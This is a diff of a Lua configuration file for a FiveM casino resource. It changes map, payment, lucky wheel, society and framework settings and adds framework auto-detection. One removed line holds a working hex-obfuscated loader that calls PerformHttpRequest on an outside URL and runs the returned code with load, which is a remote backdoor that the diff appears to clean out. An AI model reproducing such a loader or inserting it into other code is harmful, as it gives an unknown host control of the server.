@@ -1,6 +1,6 @@
 Config = {
     -- Map
-    MapType = 2, -- 1: for DLCiplLoader, 2: Gabz Casino, 3: NoPixel Casino, 4: k4mb1 casino, 5: GTA:O Interior (rcore_casino_interior)
+    MapType = 2, -- 1: for DLCiplLoader, 2: Gabz Casino, 3: NoPixel Casino, 4: k4mb1 casino, 5: GTA:O Interior (rcore_casino_interior), 6: Underground Casino PALETO
 
     --[[
     Gabz Casino
@@ -22,7 +22,7 @@ Config = {
     UseOnlyMoney = false, -- set to true if you wanna disable using casino chips and use money instead
     ExchangeRate = 1, -- set value of one casino chip, for example, set to 5, if 1 chip equals to 5$ (minimum: 0.1, rounded by 0.1, 0.5 or 1)
     ChipsInventoryItem = "casino_chips",
-    UseBankMoney = true, -- cash or bank?
+    UseBankMoney = false, -- cash or bank?
 
     -- Behave in casino?
     RestrictControls = true, -- don't jump, don't attack inside the Casino
@@ -54,11 +54,11 @@ Config = {
     ROULETTE_JUNIOR_COORDS = {1004.790, 57.295, 68.432},
 
     -- Slots
-    SLOTS_1ST_PERSON = true, -- switch to 1st person when spinning slots
+    SLOTS_1ST_PERSON = false, -- switch to 1st person when spinning slots
 
     -- Lucky Wheel
     LUCKY_WHEEL_FREE_DRINKS_FOR = (60 * 60 * 24), -- when someone spins "Free Drinks" at the Lucky Wheel, how long they get free drinks for. def: 24 hours (60 * 60 * 24)
-    LUCKY_WHEEL_COOLDOWN = (60 * 60 * 24), -- how long players have to wait for their next spin. def: 24 hours (60 * 60 * 24)
+    LUCKY_WHEEL_COOLDOWN = (0 * 0 * 0), -- how long players have to wait for their next spin. def: 24 hours (60 * 60 * 24)
     LUCKY_WHEEL_VEHICLE_ALTERNATIVE = "Money9", -- if player spins Vehicle, but there is no avaiable podium vehicle at the moment, spin to this item. Def: "Money50K" (the second biggest price)
     LUCKY_WHEEL_CAR_WINABLE = true, -- true: players can win the car, false: car is just a decoration
     LUCKY_WHEEL_PAY_TO_SPIN = 5000, -- set price for the spin (chips), set 0 for free spins, or set to existing inventory name, for example LUCKY_WHEEL_PAY_TO_SPIN = "wheel_ticket" to pay with an inventory item
@@ -75,7 +75,7 @@ Config = {
     -- Cashier
     CASHIER_DAILY_BONUS = 1000, -- daily visitor bonus that players can request at the Cashier, set to 0 if you don't want any daily bonuses. def: 1000
     CASHIER_VIP_PRICE = 50000, -- price of the VIP casino membership, def: 50000
-    CASHIER_VIP_DURATION = (60 * 60 * 30) * 30, -- VIP for player resets after this time, def: 7 days
+    CASHIER_VIP_DURATION = (60 * 60 * 24) * 7, -- VIP for player resets after this time, def: 7 days
     CASHIER_SHOW_SOCIETY_BALANCE = false, -- whether to show avaiable society balance in cashier UI
 
     -- Casino Settings (don't change unless you're told to :)
@@ -115,7 +115,7 @@ Config = {
 
     -- Drinking
     DrunkSystem = 1,
-    -- 1 = built-in, resets drunk level after leaving casino
+    -- 1 = auto-detect / built-in, resets drunk level after leaving casino
     -- 2 = esx_status
     -- 3 = evidence:client:SetStatus
     -- 4 = rcore_drunk -- https://store.rcore.cz/package/5161129
@@ -124,18 +124,27 @@ Config = {
     EnableGuidebookIntegration = false, -- https://store.rcore.cz/package/5041989
 
     -- Society
+    -- ⚠️ In order to make society work, please follow these instructions: https://documentation.rcore.cz/paid-resources/rcore_casino/society
     EnableSociety = true, -- whether to enable society account
-    SocietyName = "casino",
+    SocietyName = "society_casino",
     SocietyLimitFromBalance = 10000, -- if society account has less money than this, it will start paying out reduced money, (SocietyLimitPayoutPercentage)
     SocietyLimitPayoutPercentage = 35, -- example: if SocietyLimitPayoutPercentage is 35%, and SocietyLimitFromBalance is 10000 => 1000 payout at the Cashier will be limited to 350, if the society bank account balance is less than 10 000
     -- when enabled, all casino payments (Cashier, Bar, Lucky Wheel) go through the society account, players don't get paid if there's not enough money in the 
-    SocietyFramework = "qb-management",
+    SocietyFramework = "default",
     --[[
     'default': default, using events, qb-bossmenu/qb-management for QB, esx_addonaccount:getSharedAccount for ESX
-    'okokbanking': editing the society row using mysql, table okokbanking_societies l2s-management
+    'okokbanking': editing the society row using mysql, table okokbanking_societies
     'addon_account_data': editing the society row using mysql, table addon_account_data
     '710-Management': using 710-Management export functions
     for more details open /server/main/society.lua
+    ]]
+
+    -- Notifications
+    NotifySystem = 1,
+    --[[
+    1: default GTAV style notifications
+    2: okokNotify
+    3: esx_notify
     ]]
 
     -- Job
@@ -168,12 +177,10 @@ Config = {
 }
 
 Framework = {
-    -- 1 = es_extended
-    -- 2 = QBcore
-    -- 3 = Standalone (⚠️ check https://documentation.rcore.cz/paid-resources/rcore_casino/standalone-version)
-    -- 4 = Custom (⚠️ check https://documentation.rcore.cz/paid-resources/rcore_casino/custom-framework)
+    -- ⚠️ For Standalone version docs visit https://documentation.rcore.cz/paid-resources/rcore_casino/standalone-version
+    -- ⚠️ For Custom framework version docs visit https://documentation.rcore.cz/paid-resources/rcore_casino/custom-framework
 
-    Active = 2,
+    Active = 5, -- Choose 1 for ESX, 2 for QBCore, 3 for Standalone, 4 for Custom, 5 for auto detect
     -- Please follow the installation tutorial: --
     -- https://documentation.rcore.cz/paid-resources/rcore_casino
 
@@ -294,6 +301,8 @@ Config.OpeningHours = {
     [7] = {-1} -- Saturday
 }
 
+Config.ServerTimezoneOffsetHours = 0 -- Adjusts the server time based on the timezone difference
+
 -- customize the blip function here
 -- used blip icon ids: 
 -- Inside Track: 684, Lucky Wheel: 681, Cashier: 683, Table Games: 680, VIP Area / Exterior Icon: 679, 
@@ -324,5 +333,34 @@ function RemoveMissionBlip(name)
     end
 end
 
+-- auto-detect framework
+if Framework.Active == 5 then
+    local esxState = GetResourceState(Framework.ES_EXTENDED_RESOURCE_NAME)
+    local qbState = GetResourceState(Framework.QB_CORE_RESOURCE_NAME)
 
-local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)
+    if esxState == "starting" or esxState == "started" then
+        print("^3[Casino] Framework ^2ESX^3 detected.^7")
+        Framework.Active = 1
+    elseif qbState == "starting" or qbState == "started" then
+        print("^3[Casino] Framework ^2QBCore^3 detected.^7")
+        Framework.Active = 2
+    else
+        Framework.Active = 3
+    end
+end
+
+if Config.DrunkSystem == 1 then
+    local rcoreDrunkState = GetResourceState("rcore_drunk")
+    local esxStatusState = GetResourceState("esx_status")
+
+    if rcoreDrunkState == "starting" or rcoreDrunkState == "started" then
+        Config.DrunkSystem = 4
+        print("^3[Casino] ^2rcore_drunk^3 detected.^7")
+    elseif esxStatusState == "starting" or esxStatusState == "started" then
+        Config.DrunkSystem = 2
+        print("^3[Casino] ^2esx_status^3 detected.^7")
+    elseif Framework.Active == 2 then
+        Config.DrunkSystem = 3
+        print("^3[Casino] drunk system set to ^2evidence:^3.^7")
+    end
+end
